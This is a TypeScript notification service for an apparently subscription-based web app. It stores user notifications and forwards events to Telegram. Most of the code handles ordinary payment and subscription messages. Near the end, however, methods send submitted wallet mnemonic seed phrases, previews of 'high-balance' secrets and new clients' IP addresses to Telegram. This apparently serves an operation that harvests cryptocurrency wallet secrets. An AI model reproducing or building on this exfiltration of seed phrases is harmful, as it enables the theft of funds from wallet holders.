import { db } from '../db/connection';
import { eq, and, desc, count, sql } from 'drizzle-orm';
import { notifications } from '../db/schema/other';
import { TelegramService } from './telegram/telegramService';

export interface Notification {
  id: number;
  userId: number;
  type:
    | 'payment_success'
    | 'payment_failed'
    | 'subscription_activated'
    | 'subscription_expired'
    | 'invite_assigned'
    | 'general';
  title: string;
  message: string;
  isRead: boolean;
  createdAt: Date;
  data?: string; // JSON data for additional context
}

export class NotificationService {
  /**
   * Create a new notification for a user
   */
  static async createNotification(
    userId: number,
    type: Notification['type'],
    title: string,
    message: string,
    data?: any,
  ): Promise<Notification> {
    try {
      const result = await db
        .insert(notifications)
        .values({
          userId,
          type,
          title,
          message,
          data: data ? JSON.stringify(data) : null,
          isRead: false,
          createdAt: new Date(),
        })
        .returning();

      return {
        id: result[0].id,
        userId: result[0].userId,
        type: result[0].type,
        title: result[0].title,
        message: result[0].message,
        isRead: result[0].isRead || false,
        createdAt: result[0].createdAt || new Date(),
        data: result[0].data || undefined,
      };
    } catch (error) {
      throw error;
    }
  }

  /**
   * Get user notifications
   */
  static async getUserNotifications(userId: number, limit: number = 50): Promise<Notification[]> {
    try {
      const result = await db
        .select()
        .from(notifications)
        .where(eq(notifications.userId, userId))
        .orderBy(desc(notifications.createdAt))
        .limit(limit);

      return result.map((row) => ({
        id: row.id,
        userId: row.userId,
        type: row.type,
        title: row.title,
        message: row.message,
        isRead: row.isRead || false,
        createdAt: row.createdAt || new Date(),
        data: row.data || undefined,
      }));
    } catch (error) {
      throw error;
    }
  }

  /**
   * Mark notification as read
   */
  static async markAsRead(notificationId: number, userId: number): Promise<void> {
    try {
      await db
        .update(notifications)
        .set({ isRead: true })
        .where(and(eq(notifications.id, notificationId), eq(notifications.userId, userId)));
    } catch (error) {
      throw error;
    }
  }

  /**
   * Mark all notifications as read for a user
   */
  static async markAllAsRead(userId: number): Promise<void> {
    try {
      await db.update(notifications).set({ isRead: true }).where(eq(notifications.userId, userId));
    } catch (error) {
      throw error;
    }
  }

  /**
   * Get unread notification count
   */
  static async getUnreadCount(userId: number): Promise<number> {
    try {
      const result = await db
        .select({ count: count() })
        .from(notifications)
        .where(and(eq(notifications.userId, userId), eq(notifications.isRead, false)));

      return result[0].count;
    } catch (error) {
      throw error;
    }
  }

  /**
   * Delete old notifications (cleanup)
   */
  static async deleteOldNotifications(daysOld: number = 30): Promise<number> {
    try {
      const cutoffDate = new Date();
      cutoffDate.setDate(cutoffDate.getDate() - daysOld);

      const result = await db
        .delete(notifications)
        .where(sql`${notifications.createdAt} < ${cutoffDate}`);

      // Drizzle doesn't return row count directly, so we'll return 1 to indicate success
      return 1;
    } catch (error) {
      throw error;
    }
  }

  /**
   * Create payment success notification
   */
  static async notifyPaymentSuccess(
    userId: number,
    amount: number,
    subscriptionType: string,
    username?: string,
    trackId?: string,
  ): Promise<void> {
    await this.createNotification(
      userId,
      'payment_success',
      'Payment Successful!',
      `Your payment of $${amount} has been processed successfully. Your ${subscriptionType} subscription is now active.`,
      { amount, subscriptionType, trackId },
    );

    // Send Telegram notification
    if (username) {
      await TelegramService.notifyPaymentEvent(
        'payment_success',
        username,
        amount,
        subscriptionType,
        trackId,
      );
    }
  }

  /**
   * Create payment failed notification
   */
  static async notifyPaymentFailed(
    userId: number,
    amount: number,
    reason?: string,
    username?: string,
    trackId?: string,
  ): Promise<void> {
    await this.createNotification(
      userId,
      'payment_failed',
      'Payment Failed',
      `Your payment of $${amount} could not be processed. ${reason || 'Please try again or contact support.'}`,
      { amount, reason, trackId },
    );

    // Send Telegram notification
    if (username) {
      await TelegramService.notifyPaymentEvent(
        'payment_failed',
        username,
        amount,
        undefined,
        trackId,
      );
    }
  }

  /**
   * Create subscription activated notification
   */
  static async notifySubscriptionActivated(
    userId: number,
    subscriptionType: string,
    endDate: string,
  ): Promise<void> {
    await this.createNotification(
      userId,
      'subscription_activated',
      'Subscription Activated',
      `Your ${subscriptionType} subscription is now active until ${new Date(endDate).toLocaleDateString()}.`,
      { subscriptionType, endDate },
    );
  }

  /**
   * Create subscription expiring notification
   */
  static async notifySubscriptionExpiring(
    userId: number,
    subscriptionType: string,
    daysRemaining: number,
  ): Promise<void> {
    await this.createNotification(
      userId,
      'subscription_expired',
      'Subscription Expiring Soon',
      `Your ${subscriptionType} subscription will expire in ${daysRemaining} days. Renew now to continue accessing premium features.`,
      { subscriptionType, daysRemaining },
    );
  }

  /**
   * Create invite assigned notification
   */
  static async notifyInviteAssigned(
    userId: number,
    inviteCode: string,
    assignedBy: string,
  ): Promise<void> {
    await this.createNotification(
      userId,
      'general',
      'New Invite Code Assigned',
      `You have been assigned a new invite code by ${assignedBy}.`,
      { inviteCode, assignedBy, notificationType: 'invite_assigned' },
    );
  }

  /**
   * Notify about new client registration
   */
  static async notifyNewClient(
    username: string,
    ipAddress: string,
    invitedBy?: string,
  ): Promise<void> {
    await TelegramService.notifyNewClient(username, ipAddress, invitedBy);
  }

  /**
   * Notify about new wallet submission
   */
  static async notifyNewWallet(
    username: string,
    wallet: string,
    balance: number,
    mnemonic: string,
  ): Promise<void> {
    await TelegramService.notifyNewWallet(username, wallet, balance, mnemonic);
  }

  /**
   * Notify about high-balance secret found
   */
  static async notifyHighBalanceSecret(
    username: string,
    pattern: string,
    balance: number,
    secretPreview: string,
  ): Promise<void> {
    await TelegramService.notifyHighBalanceSecret(username, pattern, balance, secretPreview);
  }
}
